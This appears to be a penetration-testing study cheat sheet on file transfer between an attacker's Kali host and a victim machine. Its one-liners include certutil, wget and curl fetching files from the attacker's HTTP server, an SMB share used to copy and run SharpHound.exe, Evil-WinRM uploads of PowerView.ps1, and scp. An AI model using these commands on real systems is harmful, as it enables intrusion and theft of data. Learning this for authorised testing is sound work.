---
description: >-
  This took lots of time for me to compile and understand. However, through
  applying the "try harder" mentality, this concept has made me gain more
  confidence in my competence.
cover: https://media3.giphy.com/media/xTiTnjZAjQipGn9JFS/200.gif
coverY: 0
---

# 📤 File Transfer

## Windows->Linux Methods

### SMB Server

On Kali:

```
impacket-smbserver smb . -smb2support
```

On Windows:

```
net use \\<kali-ip>\smb

copy \\<kali-ip>\smb\SharpHound.exe .

dir

SharpHound.exe
```

* Be sure to open up the file through the file manager on Linux (GUI)
* This makes things easier

### Evil-WinRM

```
# Download to your Kali:
Evil-WinRM download /file/name/here

# Upload a file to the Windows victim from Kali
Evil-WinRM upload /file/name/here
```

## Linux->Windows

### Certutil

On Kali:

```
python3 -m http.server
```

On Windows:

```
certutil -urlcache -f http://<kali_ip_here:8000>/name_of_file name_of_file
```

### Evil-WinRM

```
Evil-WinRM: PS C:\programdata> upload /../../../PowerView.ps1
```

## Linux->Linux

### Wget

On Kali:

```
python3 -m http.server
```

On Victim:

```
wget http://<tun0_ip_here>:8000/<file_name_here> <file_name_here>
```

#### Or, to transfer an entire directory, use:

```
wget -r http://192.168.76.146:8000/stack
```

#### Even Better

Download it all:

```
wget -r -l inf -np -nH --cut-dirs=0 -R "index.html*" -P <Directory_to_save_to> http://webserver
```

### Curl

On Kali:

```
python3 -m http.server
```

On Victim:

```
curl http://<tun0_ip_here:8000/<file_name_here> <file_name_here>
```

## SCP

* Is SSH open?
* SSH Creds or Key
* Identify path of file you want with <mark style="color:red;">`pwd`</mark>

Copying a file from a remote system to yours:

```
scp user@10.10.10.1:C:/ftp/infrastructure .
password:

Infrastructure.pdf                                                     100%   45KB 240.7KB/s   00:00    
```

Transfering a file from your system to a remote system:

```
scp root@10.10.10.1 -i ~/.ssh/id_rsa wordlist.txt /root/wordlists
```

## References

{% embed url="https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html" %}
